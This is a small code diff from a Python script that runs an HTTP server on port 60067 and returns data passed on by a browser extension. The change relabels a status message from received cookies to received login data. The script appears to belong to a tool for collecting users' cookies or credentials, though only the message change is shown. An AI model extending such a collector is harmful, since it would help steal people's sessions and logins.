@@ -50,5 +50,5 @@ def run(server_class=HTTPServer, handler_class=Server, port=60067):
         exit(os.CLD_KILLED)
     else:
         if handler_class.data_bridge.data:
-            print("[+] Received cookies !")
+            print("[+] Received the login data from the extension !")
             return handler_class.data_bridge.data
